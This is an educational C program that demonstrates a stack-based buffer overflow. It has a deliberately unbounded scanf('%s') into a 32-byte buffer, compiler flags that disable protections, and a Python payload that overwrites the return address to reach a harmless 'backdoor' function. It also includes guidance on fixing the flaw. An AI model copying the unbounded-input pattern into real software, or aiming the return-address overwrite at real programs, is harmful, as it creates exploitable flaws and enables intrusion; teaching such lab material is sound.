#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/*
 * Vulnerability summary
 * ---------------------
 * The greet() function reads an unbounded string from standard input using
 * scanf("%s", buffer). Because "%s" stops at whitespace and does not enforce a
 * maximum length, an attacker can provide more than 31 characters to overflow
 * the 32-byte buffer on the stack. By carefully crafting the input, the saved
 * return address can be overwritten so that the program jumps into the
 * hidden function trigger_backdoor(), demonstrating a classic stack-based
 * buffer overflow.
 *
 * Compilation on modern macOS
 * ---------------------------
 * Disable stack canaries and address space layout randomization to make the
 * overflow easier to exploit for educational purposes:
 *
 *   clang -fno-stack-protector -Wl,-no_pie simple-buffer-overflow.c -o vuln
 *
 * How to exploit the example
 * --------------------------
 * 1. Compile using the command above.
 * 2. Run `python3 - <<'PY'` with the payload below to produce 40 "A" bytes
 *    followed by the little-endian address of trigger_backdoor() (determine
 *    the address with `nm vuln | grep trigger_backdoor`).
 *
 *    python3 - <<'PY'
 *    import struct
 *    payload = b"A" * 40 + struct.pack("<Q", 0x0000000100003f10)  # example
 *    print(payload.decode('latin1'), end="")
 *    PY
 *
 * 3. Pipe that payload into the program: `python3 payload.py | ./vuln`.
 *    If the address is correct, the program prints the success message from
 *    trigger_backdoor().
 *
 * How to fix the code
 * -------------------
 * Use a bounded input function, validate lengths, and compile with modern
 * defenses enabled. See simple-buffer-overflow-patched.c for a hardened
 * version that uses fgets(), length checks, and avoids dangerous library
 * calls.
 */

static void trigger_backdoor(void) {
    puts("[+] Backdoor triggered! You overflowed the buffer successfully.");
    system("/usr/bin/true");
}

void greet(void) {
    char buffer[32];

    puts("What is your name?");

    /* Vulnerable: scanf("%s", buffer) does not limit input length. */
    if (scanf("%s", buffer) != 1) {
        fputs("[-] Failed to read input\n", stderr);
        return;
    }

    printf("Hello, %s!\n", buffer);
}

int main(void) {
    greet();
    puts("Program finished normally.");
    return 0;
}
